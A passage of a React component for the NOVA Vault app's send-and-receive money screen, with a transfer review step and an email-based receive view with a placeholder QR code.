                    <button key={pct} onClick={()=>setAmount((senderBalance*pct/100).toFixed(2))} style={{ flex:1, padding:"6px", borderRadius:8, cursor:"pointer", background:C.bgElevated, border:`1px solid ${C.border}`, color:C.mutedLight, fontSize:11, fontWeight:600 }}>{pct}%</button>
                  ))}
                </div>
              </div>
              <Input label="NOTE (OPTIONAL)" placeholder="e.g. Payment for services" value={note} onChange={e=>setNote(e.target.value)} />
              {error && <div style={{ padding:"10px 14px", borderRadius:10, background:`${C.red}15`, border:`1px solid ${C.red}40`, color:C.red, fontSize:13, fontWeight:600 }}>{error}</div>}
              <GoldButton
                onClick={handleSend}
                disabled={isFrozen || !toEmail || !amount || parseFloat(amount)<=0 || parseFloat(amount)>senderBalance}
                style={{ width:"100%", padding:"16px" }}
              >
                {isFrozen ? "🔒 Account Frozen" : "Review Transfer →"}
              </GoldButton>
            </div>
          )}

          {step===2 && (
            <div style={{ display:"flex", flexDirection:"column", gap:16 }}>
              <div style={{ fontSize:17, fontWeight:800, color:C.white }}>Confirm Transfer</div>
              <Card hover={false}>
                {[
                  ["From",   user?.name||"My Account"],
                  ["To",     toEmail],
                  ["Amount", `$${parseFloat(amount).toLocaleString("en-US",{minimumFractionDigits:2})}`],
                  ["Fee",    "Free — NOVA to NOVA"],
                  ["Note",   note||"—"],
                  ["Speed",  "Instant"],
                ].map(([label,value],i,arr) => (
                  <div key={label}>
                    <div style={{ display:"flex", justifyContent:"space-between", padding:"11px 0" }}>
                      <span style={{ color:C.muted, fontSize:13 }}>{label}</span>
                      <span style={{ color:label==="Fee"?C.green:C.white, fontSize:13, fontWeight:600 }}>{value}</span>
                    </div>
                    {i<arr.length-1 && <GoldDivider />}
                  </div>
                ))}
              </Card>
              {error && <div style={{ padding:"10px 14px", borderRadius:10, background:`${C.red}15`, border:`1px solid ${C.red}40`, color:C.red, fontSize:13, fontWeight:600 }}>{error}</div>}
              <div style={{ display:"flex", gap:12 }}>
                <GoldButton variant="outline" onClick={()=>{ setStep(1); setError(""); }} style={{ flex:1 }}>Back</GoldButton>
                <GoldButton onClick={handleSend} disabled={loading||isFrozen} style={{ flex:1 }}>{loading?"Sending…":"Confirm & Send ✓"}</GoldButton>
              </div>
            </div>
          )}
        </>
      )}

      {/* RECEIVE */}
      {mode==="receive" && (
        <div style={{ display:"flex", flexDirection:"column", alignItems:"center", gap:20 }}>
          <div style={{ width:180, height:180, background:C.white, borderRadius:16, display:"flex", alignItems:"center", justifyContent:"center", padding:16 }}>
            <div style={{ width:"100%", height:"100%", background:`repeating-linear-gradient(0deg,#000 0px,#000 6px,#fff 6px,#fff 12px),repeating-linear-gradient(90deg,#000 0px,#000 6px,#fff 6px,#fff 12px)`, backgroundBlendMode:"difference", borderRadius:8 }} />
          </div>
          <div style={{ textAlign:"center", width:"100%" }}>
            <div style={{ fontSize:11, color:C.muted, letterSpacing:"0.1em", marginBottom:8 }}>YOUR NOVA VAULT EMAIL</div>
            <div style={{ fontSize:14, color:C.gold, fontWeight:700, wordBreak:"break-all", background:C.bgElevated, padding:"14px 16px", borderRadius:12, border:`1px solid ${C.border}` }}>
              {user?.email || "—"}
            </div>
            <div style={{ fontSize:12, color:C.muted, marginTop:10, lineHeight:1.7 }}>
              Share your email so others can send you money instantly inside NOVA Vault. Transfers are free and instant.
            </div>
          </div>
          <GoldButton onClick={()=>navigator.clipboard?.writeText(user?.email||"")} style={{ width:"100%" }}>📋 Copy My Email</GoldButton>
        </div>
      )}
    </div>
  );
}